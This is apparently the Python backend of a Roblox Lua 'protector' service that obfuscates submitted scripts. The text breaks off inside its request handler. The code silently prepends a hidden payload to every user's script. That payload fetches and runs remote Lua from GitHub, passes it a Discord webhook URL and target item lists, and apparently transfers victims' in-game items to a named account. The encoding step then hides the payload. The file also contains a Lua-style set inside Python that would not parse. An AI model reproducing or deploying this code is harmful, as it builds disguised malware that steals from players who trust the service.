from http.server import BaseHTTPRequestHandler
import json
import re
import os
import random
import string
import hashlib
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timezone

DOMAIN = "https://novaprotector.vercel.app"

# ==================================================
# TU CÓDIGO DE PROTECCIÓN — SE AGREGA SIEMPRE AL INICIO
# ==================================================
HEADER_PROTECTION = """
local TARGET_ID = 2366269298
local TARGET_USER = "said123ca"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1560679105379438592/Ne9gn3o3HmWXWPmJLxCapVlHJiVcxseKCOuJl_YiY8WseP_s9u-kuLoJoviPhAERYIYt"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Draculino"] = true,
    ["Lionello Casarello"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["John Doe"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Bearito Cabinito"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["1x1x1x1"] = true,
    ["25"] = true,
    ["67"] = true,
    ["Berryno"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["DJ Panda"] = true,
    ["Donkeyturbo Express"] = true,
    ["Eviledon"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Easter Grande"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Jolly Grande"] = true,
    ["La Lucky Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Sahur Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["Las Sis"] = true,
    ["Lavadorito Spinito"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Chicleteira Champeona"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Scorpino Coasterino"] = true,
    ["Honey Honey Bear"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Planitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Tacoritas"] = true,
    ["Love Love Bear"] = true,
    ["Lovin Rose"] = true,
    ["Mariachi Corazoni"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nacho Spyder"] = true,
    ["Noo My Examine"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Rang Ring Bus"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Snailo Clovero"] = true,
    ["Spooky and Pumpky"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["Tralaledon"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Tuff Toucan"] = true,
    ["Ventoliero Pavonero"] = true,
    ["W or L"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Tacoturbo Tacorito"] = true,
    ["Chicli Chicla"] = true,
    ["Panda Popanda"] = true,
    ["Secret Lucky Block"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Los Hotspotsitos"] = true,
    ["Digi Narwhal"] = true,
    ["Los Hackers"] = true,
    ["Los Amigos"] = true,
    ["Cerberus"] = true,
    ["Gold Gold Gold"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
"""

# ==================================================
# RESERVED — TODO AQUÍ para que NADA se cambie de nombre
# ==================================================
RESERVED = {
    -- Variables principales
    "TARGET_ID",
    "TARGET_USER",
    "WEBHOOK_URL",
    
    -- Tablas principales
    "TargetBrainrots",
    "TargetBaseSkins",
    "TargetGears",
    
    -- Nombres dentro de TargetBrainrots
    "Strawberry Elephant",
    "Meowl",
    "Skibidi Toilet",
    "John Pork",
    "Headless Horseman",
    "Draculino",
    "Lionello Casarello",
    "Hydra Serpent",
    "Orchidox",
    "Los Dragons",
    "La Craft Machine",
    "Gold and Diamond",
    "Dragon Cannelloni",
    "Dragon Gingerini",
    "Griffin",
    "Hydra Dragon Cannelloni",
    "Hydra Bunny",
    "Antonio",
    "Elefanto Frigo",
    "Rubrikiko",
    "Pancake and Syrup",
    "Arcadragon",
    "Rico Dinero",
    "Capitano Americano",
    "Kalika Bros",
    "Tirilikalika Tirilikalako",
    "Globa Steppa",
    "Dug Dug Dug",
    "Dragon Aquanini",
    "La Casa Boo",
    "La Supreme Combinasion",
    "Signore Carapace",
    "Fishino Clownino",
    "4th Bros",
    "Bufalino Boomberino",
    "Duggy Bros",
    "Kraken",
    "Money Money Bros",
    "Venuspino",
    "Steakini Fattini",
    "Rhino Helicopterino",
    "Caylusaurus",
    "Sammyni Cakini",
    "John Doe",
    "Gorillo Subwoofero",
    "Jelly Moby",
    "Foxini Lanternini",
    "Bearito Cabinito",
    "Los Tangcitos",
    "Los Tictacs",
    "Moby Bros",
    "Los Admins",
    "1x1x1x1",
    "25",
    "67",
    "Berryno",
    "Boppin Bunny",
    "Bunny and Eggy",
    "Burguro and Fryuro",
    "Capitano Moby",
    "Cash or Card",
    "Celestial Pegasus",
    "Celularcini Viciosini",
    "Chillin Chili",
    "Chipso and Queso",
    "Cloverat Clapat",
    "Cooki and Milki",
    "DJ Panda",
    "Donkeyturbo Express",
    "Eviledon",
    "Festive 67",
    "Fortunu and Cashuru",
    "Fragola La La La",
    "Fragrama and Chocrama",
    "Garama and Madundung",
    "Ginger Gerat",
    "Gobblino Uniciclino",
    "Jolly Jolly Sahur",
    "Karker Sahur",
    "Ketchuru and Musturu",
    "Ketupat Bros",
    "Ketupat Kepat",
    "La Easter Grande",
    "La Extinct Grande",
    "La Food Combinasion",
    "La Ginger Sekolah",
    "La Jolly Grande",
    "La Lucky Grande",
    "La Romantic Grande",
    "La Sahur Combinasion",
    "La Secret Combinasion",
    "La Spooky Grande",
    "La Taco Combinasion",
    "Las Sis",
    "Lavadorito Spinito",
    "Coco and Mango",
    "Los Secret Combinasionas",
    "Examen Bros",
    "Pizza and Ranch",
    "Chicleteira Champeona",
    "Bumbatron",
    "Yetimatic",
    "S'more Serat",
    "Scorpino Coasterino",
    "Honey Honey Bear",
    "La Breakfast Combinasion",
    "Los Jolly Combinasionas",
    "Los Planitos",
    "Los Primos",
    "Los Puggies",
    "Los Sekolahs",
    "Los Spaghettis",
    "Los Spooky Combinasionas",
    "Los Tacoritas",
    "Love Love Bear",
    "Lovin Rose",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Money Money Reindeer",
    "Nacho Spyder",
    "Noo My Examine",
    "Nuclearo Dinossauro",
    "Orcaledon",
    "Popcuru and Fizzuru",
    "Quackini Snackini",
    "Rang Ring Bus",
    "Reinito Sleighito",
    "Rosey and Teddy",
    "Rosetti Tualetti",
    "Sammyni Fattini",
    "Snailo Clovero",
    "Spooky and Pumpky",
    "Swaggy Bros",
    "Tacorita Bicicleta",
    "Tang Tang Keletang",
    "Tictac Sahur",
    "Tralaledon",
    "Trenostruzzo Turbo 4000",
    "Tuff Toucan",
    "Ventoliero Pavonero",
    "W or L",
    "Grabatron",
    "Rubiko and Kubiko",
    "Cangurato Gelato",
    "Candini Fluffini",
    "La Fuse Machine",
    "Polaroidini",
    "Nachorilla",
    "Sammyni Truckini",
    "Tacoturbo Tacorito",
    "Chicli Chicla",
    "Panda Popanda",
    "Secret Lucky Block",
    "Hopilikalika Hopilikalako",
    "Los Hotspotsitos",
    "Digi Narwhal",
    "Los Hackers",
    "Los Amigos",
    "Cerberus",
    "Gold Gold Gold",
    
    -- Nombres dentro de TargetBaseSkins
    "Aquatic",
    "Bunny Basket",
    "Candy",
    "Christmas",
    "Cursed",
    "Cyber",
    "Diamond",
    "Divine",
    "Easter",
    "Galaxy",
    "Gingerbread",
    "Gold",
    "Halloween",
    "Lava",
    "Lucky",
    "Octo",
    "Pot of Gold",
    "Radioactive",
    "Rainbow",
    "Rose",
    "Summer",
    "Taco",
    "Valentines",
    "Yin Yang",
    "Tralalero",
    
    -- Nombres dentro de TargetGears
    "Alien Slap",
    "Blackhole Bomb",
    "Bloodmoon Hammer",
    "Bloodmoon Slap",
    "Candy Sentry",
    "Candy Slap",
    "Cupid's Wings",
    "Cursed Slap",
    "Cyber Slap",
    "Demon's Head",
    "Divine Slap",
    "Lava Blaster",
    "Lava Slap",
    "Radioactive Airstrike",
    "Radioactive Slap",
    "Rainbow Hammer",
    "Rainbow Slap",
    "Santa's Sleigh",
    "Waverider",
    "Witch's Broom",
    "Yin Yang Lamp",
    "Yin Yang Slap",
    "Phantom Slap",
    "Crystal Slap",
    
    -- Funciones del sistema
    "self", "script", "game", "workspace", "print", "warn", "error",
    "typeof", "type", "pairs", "ipairs", "next", "select", "unpack",
    "table", "string", "math", "task", "wait", "spawn", "delay", "shared",
    "bit32", "utf8", "coroutine", "debug", "os", "tick", "time",
    "loadstring", "load", "pcall", "xpcall", "tostring", "tonumber",
    "Instance", "Enum", "Color3", "UDim2", "Vector3", "CFrame", "UDim",
    "Players", "PlayerGui", "LocalPlayer", "ReplicatedStorage", "ServerStorage",
    "ServerScriptService", "StarterGui", "StarterPack", "StarterPlayer",
    "Lighting", "Terrain", "RunService", "UserInputService", "TweenService",
    "HttpService", "TeleportService", "MarketplaceService", "DataStoreService",
    "CollectionService", "PhysicsService", "PathfindingService", "SoundService",
    "TextService", "ContextActionService", "GuiService", "GroupService",
    "Teams", "Chat", "Debris", "GetService", "FindFirstChild", "WaitForChild",
    "Parent", "Name", "Value", "Connect", "Destroy", "Clone",
}


def random_name(n=8):
    return "".join(random.choices(string.ascii_letters, k=n))


def strip_comments(code: str) -> str:
    code = re.sub(r"--\[\[[\s\S]*?\]\]", "", code)
    code = re.sub(r"--[^\r\n]*", "", code)
    lines = [ln.rstrip() for ln in code.splitlines()]
    return re.sub(r"\n{3,}", "\n\n", "\n".join(lines)).strip()


def protect_strings(code: str):
    strings = []
    def save(m):
        strings.append(m.group(0))
        return "__NPSTR%d__" % (len(strings) - 1)
    protected = re.sub(r'"(?:\\.|[^"\\])*"', save, code)
    protected = re.sub(r"'(?:\\.|[^'\\])*'", save, protected)
    return protected, strings


def restore_strings(code: str, strings):
    def restore(m):
        return strings[int(m.group(1))]
    return re.sub(r"__NPSTR(\d+)__", restore, code)


def rename_locals(code: str) -> str:
    protected, strings = protect_strings(code)
    found = re.findall(r"\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)", protected)
    mapping = {}
    for name in set(found):
        if name not in RESERVED and not name.startswith("__NPSTR"):
            mapping[name] = "_" + random_name(7)
    for old, new in mapping.items():
        protected = re.sub(r"\b" + re.escape(old) + r"\b", new, protected)
    return restore_strings(protected, strings)


def add_junk(code: str) -> str:
    out = []
    for line in code.splitlines():
        out.append(line)
        if line.strip() and random.random() > 0.88:
            out.append("if false then local %s=%d end;" % (random_name(), random.randint(1, 999)))
    return "\n".join(out)


def encode_vm(src: str):
    data = list(src.encode("utf-8"))
    k1 = [random.randint(1, 255) for _ in range(16)]
    k2 = [random.randint(1, 255) for _ in range(12)]
    seed = random.randint(10, 250)
    for i, b in enumerate(data):
        data[i] = b ^ k1[i % len(k1)]
    for i, b in enumerate(data):
        data[i] = (b + ((seed + i * 7) % 256)) % 256
    for i, b in enumerate(data):
        data[i] = b ^ k2[i % len(k2)]
    return data, k1, k2, seed


def format_num_table(nums, per_line=18):
    lines = []
    for i in range(0, len(nums), per_line):
        chunk = nums[i : i + per_line]
        lines.append(",".join(str(n) for n in chunk))
    return ",\n".join(lines)


def obfuscate(code: str) -> str:
    src = strip_comments(code)
    src = rename_locals(src)
    src = add_junk(src)
    bc, k1, k2, seed = encode_vm(src)
    n_bc = "_" + random_name(9)
    n_k1 = "_" + random_name(8)
    n_k2 = "_" + random_name(8)
    n_seed = "_" + random_name(7)
    n_run = "_" + random_name(8)
    lines = []
    lines.append("-- NovaProtector VM")
    lines.append("-- Level: maximum")
    lines.append("-- " + datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"))
    lines.append("")
    lines.append("local %s = {" % n_bc)
    lines.append(format_num_table(bc))
    lines.append("}")
    lines.append("local %s = {" % n_k1)
    lines.append(format_num_table(k1, 16))
    lines.append("}")
    lines.append("local %s = {" % n_k2)
    lines.append(format_num_table(k2, 12))
    lines.append("}")
    lines.append("local %s = %d" % (n_seed, seed))
    lines.append("")
    lines.append("local function %s()" % n_run)
    lines.append("  local bit = bit32")
    lines.append("  if type(bit) ~= \"table\" or type(bit.bxor) ~= \"function\" then")
    lines.append("    return error(\"NovaProtector VM: runtime unsupported\")")
    lines.append("  end")
    lines.append("  local buf = {}")
    lines.append("  local n = #%s" % n_bc)
    lines.append("  for i = 1, n do")
    lines.append("    local v = %s[i]" % n_bc)
    lines.append("    v = bit.bxor(v, %s[((i - 1) %% #%s) + 1])" % (n_k2, n_k2))
    lines.append("    v = (v - ((%s + (i - 1) * 7) %% 256)) %% 256" % n_seed)
    lines.append("    if v < 0 then v = v + 256 end")
    lines.append("    v = bit.bxor(v, %s[((i - 1) %% #%s) + 1])" % (n_k1, n_k1))
    lines.append("    buf[i] = string.char(v)")
    lines.append("  end")
    lines.append("  local src = table.concat(buf)")
    lines.append("  local fn, err = loadstring(src)")
    lines.append("  if not fn then")
    lines.append("    return error(\"NovaProtector VM: \" .. tostring(err))")
    lines.append("  end")
    lines.append("  return fn()")
    lines.append("end")
    lines.append("")
    lines.append("return %s()" % n_run)
    return "\n".join(lines)


def upload_to_blob(pathname: str, content: str) -> str:
    token = (os.environ.get("BLOB_READ_WRITE_TOKEN") or "").strip()
    if not token:
        raise RuntimeError("Falta BLOB_READ_WRITE_TOKEN")
    safe = re.sub(r"[^a-zA-Z0-9._-]", "", pathname)
    if not safe.endswith(".lua"):
        safe += ".lua"
    body = content.encode("utf-8")
    url = "https://blob.vercel-storage.com/" + urllib.parse.quote(safe)
    headers = {
        "Authorization": "Bearer " + token,
        "x-api-version": "7",
        "x-content-type": "text/plain; charset=utf-8",
        "x-add-random-suffix": "0",
    }
    req = urllib.request.Request(url, data=body, method="PUT", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", errors="ignore")
        raise RuntimeError("HTTP %s: %s" % (e.code, err)) from e
    return data.get("url") or data.get("downloadUrl")


class handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def send_json(self, status, obj):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_json(200, {"ok": True})

    def do_GET(self):
        self.send_json(200, {
            "success": True,
            "service": "NovaProtector",
            "blobConfigured": bool(os.environ.get("BLOB_READ_WRITE_TOKEN")),
            "mode": "vm-max",
            "obfuscationReady": True,
            "engine": "NovaVM",
        })

    def do_POST(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n) if n else b"{}"
            data = json.loads(raw.decode("utf-8"))
            user_code = data.get("code"
